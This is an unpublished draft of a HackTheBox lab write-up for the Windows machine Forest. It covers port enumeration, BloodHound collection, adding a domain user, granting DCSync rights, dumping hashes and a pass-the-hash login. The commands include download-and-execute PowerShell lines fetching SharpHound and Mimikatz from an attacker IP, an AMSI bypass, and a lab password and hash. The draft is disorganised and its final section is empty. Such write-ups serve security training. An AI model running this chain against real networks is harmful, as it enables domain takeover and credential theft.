---
layout: post
title: "HTB: Forest"
date: 2022-08-10 18:07 +0100
tags: hackthebox htb activedirectory hacking ldap bloodhound
categories: [Pentesting, HackTheBox]
published: false
---

Forest is a fully Windows based machine which is semi-unique on HackTheBox in that it doesn't have a web server running. We start by enumerating the open ports eith `nmap` and find LDAP running. From there we're able to use APRep Roasting to get a hash which we crack using `JohnTheRipper` and gain access to the machine using `evil-winrm` where we're able to gather some information to dump into `BloodHound` and from there gain full admin through causing a DCSync and then dumping the Administrators hash with `impacket-secretsdump`.

Strap in.

![Forest](/assets/img/Forest.png)

## Enumeration

*Nmap Results (clipped)*

```
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-09-23 09:55:12Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack Microsoft Windows RPC
49680/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        syn-ack Microsoft Windows RPC
49685/tcp open  msrpc        syn-ack Microsoft Windows RPC
49701/tcp open  msrpc        syn-ack Microsoft Windows RPC
```

Lots of open ports, most of them are garbage*

The main ones of interest for us since there is no web server, are the LDAP and SMB ports, and also Kerberos, but we can't really do much with Kerberos until we have some credentials.

And just for completeness, Simple DNS Plus is vulnerable to a [Remote DoS attack](https://www.exploit-db.com/exploits/6059)

> \*Something I've noticed in people who are new to Windows Pentesting is that they tend to panic when they see the output from `nmap` and see all of those ports open. Run Service Verification on them and you'll see it's mostly just RPC and while there is some useful information you can gain from RPC it's very low on the list of things you can actively exploit.
{: .prompt-tip }

## User.txt

```bash
# Python Bloodhound Ingestor (returned some slightly jank data)
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.129.95.210

# SharpHound.ps1
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.3:8000/SharpHound.ps1")
Invoke-BloodHound

After reviewing the BloodHound data we find a path to DC Administrator via the following:

- svc-alfresco is a member of "Service Accounts"
- "Service Accounts" is a member of "Priviledged IT Accounts"
- "Priviledged IT Accounts" is a member of "Account Operators"
- members of "Account Operators" have "GenericAll" permissions on "Exchange Windows Permissions"


IWR -Uri http://10.10.14.3:8000/PowerView.ps1 -Outfile pv.ps1
Bypass-4MSI

# Add a user
net user bullsec Test123 /add /domain

# Add them to the correct groups
net group "Exchange Windows Permissions" bullsec /add
net localgroup "Remote Management Users" bullsec /add


evil-winrm -i 10.129.228.27 -u bullsec -p Test123
$pass = convertto-securestring 'Test123' -asplain -force
$cred = new-object system.management.automation.pscredential("htb\bullsec", $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bullsec -Rights DCSync
impacket-secretsdump htb/bullsec@10.129.228.27 -outputfile forest.hashes
impacket-psexec administrator@10.129.228.27 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
type C:\Users\Administrator\Desktop\root.txt
exit

$pass = convertto-securestring 'Test123' -asplain -force
$cred = new-object system.management.automation.pscredential("htb\bullsec", $pass)

# This doesn't work
Add-ObjectACL -PrincipalIdentity bullsec -Credential $cred -Rights DCSync
DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.

# This does


Add-DomainObjectAcl


IEX(New-Object Net.WebClient).downloadString("http://10.10.14.3:8000/Invoke-Mimikatz.ps1")
```

## BloodHound

![BloodHound Graph](/assets/img/2022-10-09-00-08-09.png)

## Root.txt
